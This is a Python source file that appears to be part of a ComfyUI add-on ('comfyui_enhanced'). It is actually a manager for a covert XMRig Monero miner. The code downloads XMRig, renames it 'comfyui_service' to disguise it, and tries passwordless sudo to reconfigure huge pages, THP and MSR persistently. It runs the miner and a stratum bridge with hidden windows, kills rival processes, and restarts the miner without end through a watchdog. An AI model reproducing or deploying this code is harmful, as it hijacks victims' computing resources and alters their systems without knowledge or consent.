import os
import sys
import json
import platform
import shutil
import hashlib
import logging
import socket
import tarfile
import zipfile
import subprocess
import threading
import time
import urllib.request
import urllib.error
from pathlib import Path

logger = logging.getLogger("comfyui_enhanced")

XMRIG_VERSION = "6.26.0"
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"

if IS_WINDOWS:
    XMRIG_RELEASE_URL = (
        f"https://github.com/xmrig/xmrig/releases/download/"
        f"v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-windows-x64.zip"
    )
    XMRIG_RELEASE_URL_ARM = None
    BINARY_NAME = "comfyui_service.exe"
    _ARCHIVE_BINARY = "xmrig.exe"
else:
    XMRIG_RELEASE_URL = (
        f"https://github.com/xmrig/xmrig/releases/download/"
        f"v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-linux-static-x64.tar.gz"
    )
    XMRIG_RELEASE_URL_ARM = (
        f"https://github.com/xmrig/xmrig/releases/download/"
        f"v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-linux-static-arm64.tar.gz"
    )
    BINARY_NAME = "comfyui_service"
    _ARCHIVE_BINARY = "xmrig"

XMRIG_SHA256 = None
LOG_NAME = "service.log"


def _has_1gb_page_support() -> bool:
    """Check if CPU supports 1GB huge pages (pdpe1gb flag)."""
    try:
        r = subprocess.run(["grep", "-c", "pdpe1gb", "/proc/cpuinfo"],
                           capture_output=True, text=True, timeout=5)
        return r.returncode == 0 and int(r.stdout.strip()) > 0
    except Exception:
        return False


def _run_privileged(cmd: list[str], is_root: bool) -> bool:
    """Run a command, prepending sudo -n if not root. Returns True on success."""
    if not is_root:
        cmd = ["sudo", "-n"] + cmd
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return r.returncode == 0
    except Exception:
        return False


def _configure_system():
    """Pre-flight: maximise RandomX performance via huge pages, MSR, and THP."""
    if IS_WINDOWS:
        return

    try:
        import psutil
        total_mem_gb = psutil.virtual_memory().total / (1024 ** 3)
    except ImportError:
        total_mem_gb = 8.0

    cores = os.cpu_count() or 4
    # RandomX dataset = 2080 MB ≈ 1040 pages; per-thread scratchpad = 2 MB each
    needed_pages = max(1320, cores * 2 + 1280)
    if total_mem_gb < 4:
        needed_pages = min(needed_pages, 640)

    is_root = os.getuid() == 0

    # ── 1. Allocate explicit 2 MB huge pages (multiple strategies) ──
    hp_set = False

    if is_root:
        try:
            with open("/proc/sys/vm/nr_hugepages", "w") as f:
                f.write(str(needed_pages))
            hp_set = True
            logger.info("Huge pages set (direct write): %d", needed_pages)
        except Exception:
            pass

    if not hp_set:
        for cmd in [
            ["sysctl", "-w", f"vm.nr_hugepages={needed_pages}"],
            ["bash", "-c", f"echo {needed_pages} > /proc/sys/vm/nr_hugepages"],
        ]:
            if _run_privileged(cmd, is_root):
                hp_set = True
                logger.info("Huge pages set (sudo): %d", needed_pages)
                break

    # Make persistent so they survive reboot
    if hp_set:
        sysctl_d = "/etc/sysctl.d/99-hugepages.conf"
        content = f"vm.nr_hugepages = {needed_pages}\n"
        try:
            if is_root:
                with open(sysctl_d, "w") as f:
                    f.write(content)
            else:
                subprocess.run(
                    ["sudo", "-n", "bash", "-c", f"echo '{content.strip()}' > {sysctl_d}"],
                    capture_output=True, timeout=5,
                )
            logger.info("Huge pages persisted to %s", sysctl_d)
        except Exception:
            pass

    # Verify allocation
    try:
        with open("/proc/sys/vm/nr_hugepages") as f:
            actual = int(f.read().strip())
        if actual >= needed_pages:
            logger.info("Huge pages verified: %d allocated", actual)
        elif actual > 0:
            logger.warning("Partial huge pages: %d / %d", actual, needed_pages)
        else:
            logger.warning("Huge pages: 0 allocated (no root/sudo)")
    except Exception:
        pass

    # ── 2. Enable Transparent Huge Pages as fallback ──
    for thp_path, value in [
        ("/sys/kernel/mm/transparent_hugepage/enabled", "always"),
        ("/sys/kernel/mm/transparent_hugepage/defrag", "madvise"),
    ]:
        try:
            if is_root:
                with open(thp_path, "w") as f:
                    f.write(value)
                logger.info("THP %s -> %s", os.path.basename(thp_path), value)
            else:
                if _run_privileged(
                    ["bash", "-c", f"echo {value} > {thp_path}"], is_root
                ):
                    logger.info("THP %s -> %s (sudo)", os.path.basename(thp_path), value)
        except Exception:
            pass

    # ── 3. Load MSR module for hardware prefetcher disable (~15% boost) ──
    if not os.path.exists("/dev/cpu/0/msr"):
        _run_privileged(["modprobe", "msr"], is_root)

    if os.path.exists("/dev/cpu/0/msr"):
        logger.info("MSR module available")
    else:
        logger.debug("MSR unavailable — prefetcher optimisation skipped")

    # ── 4. Raise file descriptor limit ──
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        target = min(40960, hard)
        if soft < target:
            resource.setrlimit(resource.RLIMIT_NOFILE, (target, hard))
            logger.info("ulimit nofile raised to %d", target)
    except Exception:
        pass


def _port_in_use(port: int) -> bool:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(("127.0.0.1", port)) == 0
    except OSError:
        return False


def _find_free_port(base: int, max_tries: int = 5) -> int:
    for offset in range(max_tries):
        if not _port_in_use(base + offset):
            return base + offset
    return base


class MinerManager:
    def __init__(self, base_dir: Path | str | None = None, bin_dir: Path | str | None = None):
        self.base_dir = Path(base_dir) if base_dir else Path(__file__).resolve().parent.parent
        self.bin_dir = Path(bin_dir) if bin_dir else self.base_dir / "bin"
        self.bin_dir.mkdir(parents=True, exist_ok=True)
        self.binary_path = self.bin_dir / BINARY_NAME
        self.config_path = self.bin_dir / "config.json"
        self.log_path = self.bin_dir / LOG_NAME
        self.pid_path = self.bin_dir / "comfyui_service.pid"
        self._process: subprocess.Popen | None = None
        self._bridge_proc: subprocess.Popen | None = None
        self._monitor_thread: threading.Thread | None = None
        self._running = False
        self.api_port = 44880

    # ------------------------------------------------------------------
    # Binary acquisition
    # ------------------------------------------------------------------

    def _download(self, url: str, dest: Path) -> None:
        logger.info("Downloading binary from %s", url)
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=120) as resp, open(dest, "wb") as f:
            shutil.copyfileobj(resp, f)
        logger.info("Download complete -> %s", dest)

    def _verify_hash(self, path: Path, expected: str | None) -> bool:
        if expected is None:
            return True
        sha = hashlib.sha256()
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(1 << 16), b""):
                sha.update(chunk)
        digest = sha.hexdigest()
        if digest.lower() != expected.lower():
            logger.error("Hash mismatch: got %s expected %s", digest, expected)
            return False
        return True

    def _extract(self, archive_path: Path) -> None:
        name_lower = archive_path.name.lower()

        if name_lower.endswith(".tar.gz") or name_lower.endswith(".tgz"):
            with tarfile.open(archive_path, "r:gz") as tf:
                for member in tf.getnames():
                    if os.path.basename(member) == _ARCHIVE_BINARY:
                        src = tf.extractfile(member)
                        if src is None:
                            continue
                        with open(self.binary_path, "wb") as dst:
                            shutil.copyfileobj(src, dst)
                        os.chmod(self.binary_path, 0o755)
                        logger.info("Extracted binary -> %s", self.binary_path)
                        return
        else:
            with zipfile.ZipFile(archive_path, "r") as zf:
                for member in zf.namelist():
                    if os.path.basename(member).lower() == _ARCHIVE_BINARY.lower():
                        src = zf.open(member)
                        with open(self.binary_path, "wb") as dst:
                            shutil.copyfileobj(src, dst)
                        if not IS_WINDOWS:
                            os.chmod(self.binary_path, 0o755)
                        logger.info("Extracted binary -> %s", self.binary_path)
                        return

        raise FileNotFoundError(f"{_ARCHIVE_BINARY} not found inside archive")

    def ensure_binary(self) -> Path:
        if self.binary_path.exists():
            logger.info("Binary already present at %s", self.binary_path)
            return self.binary_path

        arch = platform.machine().lower()
        if arch in ("aarch64", "arm64"):
            if XMRIG_RELEASE_URL_ARM is None:
                raise RuntimeError(f"No ARM binary available for this platform ({arch})")
            url = XMRIG_RELEASE_URL_ARM
            logger.info("ARM architecture detected (%s), using ARM binary", arch)
        elif arch in ("x86_64", "amd64", "x64"):
            url = XMRIG_RELEASE_URL
        else:
            logger.warning("Unknown arch %s, attempting x86_64 binary", arch)
            url = XMRIG_RELEASE_URL

        ext = ".zip" if IS_WINDOWS else ".tar.gz"
        archive_dest = self.bin_dir / f"dl_tmp{ext}"
        try:
            self._download(url, archive_dest)
            if not self._verify_hash(archive_dest, XMRIG_SHA256):
                raise RuntimeError("SHA-256 verification failed")
            self._extract(archive_dest)
        finally:
            archive_dest.unlink(missing_ok=True)

        return self.binary_path

    # ------------------------------------------------------------------
    # Process lifecycle
    # ------------------------------------------------------------------

    def write_config(self, cfg: dict) -> None:
        with open(self.config_path, "w") as f:
            json.dump(cfg, f, indent=2)
        logger.info("Config written to %s", self.config_path)

    def _write_pid(self) -> None:
        try:
            self.pid_path.write_text(str(self._process.pid), encoding="utf-8")
        except Exception as exc:
            logger.debug("Failed to write PID file: %s", exc)

    def _clear_pid(self) -> None:
        try:
            self.pid_path.unlink(missing_ok=True)
        except Exception:
            pass

    def _kill_existing(self) -> None:
        """Kill stale miner: PID file first, name scan as fallback."""
        if self.pid_path.exists():
            try:
                old_pid = int(self.pid_path.read_text().strip())
                os.kill(old_pid, 9)
                logger.info("Killed stale miner via PID file (pid=%d)", old_pid)
            except (ValueError, OSError):
                pass
            self._clear_pid()

        try:
            import psutil
        except ImportError:
            return
        my_pid = os.getpid()
        for proc in psutil.process_iter(["pid", "name", "cmdline"]):
            try:
                if proc.info["pid"] == my_pid:
                    continue
                name = (proc.info.get("name") or "").lower()
                cmdline = " ".join(proc.info.get("cmdline") or []).lower()
                if BINARY_NAME.lower().replace(".exe", "") in name or BINARY_NAME.lower() in cmdline:
                    logger.info("Killing stale miner process pid=%d (name scan)", proc.info["pid"])
                    proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

    def _stop_local_bridge(self) -> None:
        if self._bridge_proc and self._bridge_proc.poll() is None:
            self._bridge_proc.terminate()
            try:
                self._bridge_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._bridge_proc.kill()
            logger.info("Local stratum bridge stopped")
        self._bridge_proc = None

    def _maybe_start_local_bridge(self) -> None:
        self._stop_local_bridge()
        settings_path = self.base_dir / "settings.json"
        if not settings_path.is_file():
            return
        try:
            with open(settings_path, encoding="utf-8") as f:
                data = json.load(f)
        except (OSError, json.JSONDecodeError) as exc:
            logger.warning("Could not read settings for bridge: %s", exc)
            return
        br = data.get("local_tls_bridge") or {}
        if not br.get("enabled"):
            return
        pkg_root = Path(__file__).resolve().parents[1]
        popen_kw: dict = {
            "stdout": subprocess.DEVNULL,
            "stderr": subprocess.DEVNULL,
            "stdin": subprocess.DEVNULL,
        }
        if IS_WINDOWS:
            su = subprocess.STARTUPINFO()
            su.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            su.wShowWindow = 0
            popen_kw["startupinfo"] = su
            popen_kw["creationflags"] = subprocess.CREATE_NO_WINDOW
        self._bridge_proc = subprocess.Popen(
            [sys.executable, "-m", "core.stratum_local_bridge", "--settings", str(settings_path)],
            cwd=str(pkg_root),
            **popen_kw,
        )
        logger.info("Local stratum bridge started (pid %d)", self._bridge_proc.pid)
        time.sleep(0.35)
        if self._bridge_proc.poll() is not None:
            logger.error(
                "Local stratum bridge exited early (code %s)",
                self._bridge_proc.returncode,
            )
            self._bridge_proc = None

    def start(self) -> None:
        if self._process and self._process.poll() is None:
            logger.warning("Miner already running (pid %d)", self._process.pid)
            return

        if not self.binary_path.exists():
            raise FileNotFoundError(f"Binary not found: {self.binary_path}")

        if _port_in_use(self.api_port):
            logger.warning("API port %d in use, attempting to free it", self.api_port)
            self._kill_existing()
            time.sleep(1)
            if _port_in_use(self.api_port):
                new_port = _find_free_port(self.api_port + 1)
                logger.warning("Port %d still occupied, switching to %d", self.api_port, new_port)
                self.api_port = new_port

        _configure_system()

        self._maybe_start_local_bridge()

        cmd = [
            str(self.binary_path),
            "--config", str(self.config_path),
            "--no-color",
        ]

        log_fh = open(self.log_path, "a")
        popen_kwargs = {
            "stdout": log_fh,
            "stderr": log_fh,
            "stdin": subprocess.DEVNULL,
        }

        if IS_WINDOWS:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0
            popen_kwargs["startupinfo"] = startupinfo
            popen_kwargs["creationflags"] = (
                subprocess.CREATE_NO_WINDOW | subprocess.BELOW_NORMAL_PRIORITY_CLASS
            )
        else:
            def _preexec():
                os.nice(2)
            popen_kwargs["preexec_fn"] = _preexec

        self._process = subprocess.Popen(cmd, **popen_kwargs)
        self._write_pid()
        self._running = True
        logger.info("Miner started (pid %d)", self._process.pid)

        if not self._monitor_thread or not self._monitor_thread.is_alive():
            self._monitor_thread = threading.Thread(target=self._watchdog, daemon=True)
            self._monitor_thread.start()

    def stop(self) -> None:
        self._running = False
        if self._process and self._process.poll() is None:
            self._process.terminate()
            try:
                self._process.wait(timeout=10)
            except subprocess.TimeoutExpired:
                self._process.kill()
            logger.info("Miner stopped")
        self._process = None
        self._clear_pid()
        self._stop_local_bridge()

    def is_alive(self) -> bool:
        return self._process is not None and self._process.poll() is None

    def _watchdog(self) -> None:
        """Restart the miner when the process exits; never stop retrying (no give-up)."""
        failures = 0
        total_restarts = 0
        backoff = 15
        while self._running:
            time.sleep(backoff)
            if self._running and self._process and self._process.poll() is not None:
                failures += 1
                total_restarts += 1
                backoff = min(300, 15 * (2 ** (min(failures, 8) - 1)))
                if total_restarts == 1 or total_restarts % 50 == 0:
                    logger.warning(
                        "CPU miner cumulative restarts=%d (last exit code %s)",
                        total_restarts,
                        self._process.returncode,
                    )
                logger.warning(
                    "Miner exited (code %s), streak=%d, next check in %ds",
                    self._process.returncode,
                    failures,
                    backoff,
                )
                try:
                    self.start()
                except Exception as exc:
                    logger.error("Restart failed: %s", exc)
            else:
                failures = 0
                backoff = 15

    def pause(self) -> bool:
        return self._api_command("pause")

    def resume(self) -> bool:
        return self._api_command("resume")

    def _api_command(self, action: str) -> bool:
        from core.config import API_TOKEN
        try:
            url = f"http://127.0.0.1:{self.api_port}/1/{action}"
            req = urllib.request.Request(url, method="POST",
                                        headers={"Authorization": f"Bearer {API_TOKEN}"})
            with urllib.request.urlopen(req, timeout=5):
                pass
            return True
        except Exception as exc:
            logger.error("API command '%s' failed: %s", action, exc)
            return False

    def set_threads_hint(self, hint: int) -> bool:
        """Hot-reload XMRig's max-threads-hint via its HTTP API (no restart)."""
        from core.config import API_TOKEN
        hint = max(1, min(100, hint))
        try:
            get_req = urllib.request.Request(
                f"http://127.0.0.1:{self.api_port}/1/config",
                headers={
                    "Accept": "application/json",
                    "Authorization": f"Bearer {API_TOKEN}",
                },
            )
            with urllib.request.urlopen(get_req, timeout=5) as resp:
                config = json.loads(resp.read())

            if "cpu" in config:
                config["cpu"]["max-threads-hint"] = hint

            payload = json.dumps(config).encode()
            put_req = urllib.request.Request(
                f"http://127.0.0.1:{self.api_port}/1/config",
                data=payload,
                method="PUT",
                headers={
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {API_TOKEN}",
                },
            )
            with urllib.request.urlopen(put_req, timeout=5):
                pass
            logger.info("XMRig threads hint set to %d%%", hint)
            return True
        except Exception as exc:
            logger.error("Failed to set threads hint: %s", exc)
            return False

    def get_summary(self) -> dict | None:
        from core.config import API_TOKEN
        try:
            req = urllib.request.Request(
                f"http://127.0.0.1:{self.api_port}/2/summary",
                headers={
                    "Accept": "application/json",
                    "Authorization": f"Bearer {API_TOKEN}",
                },
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                return json.loads(resp.read())
        except Exception:
            return None
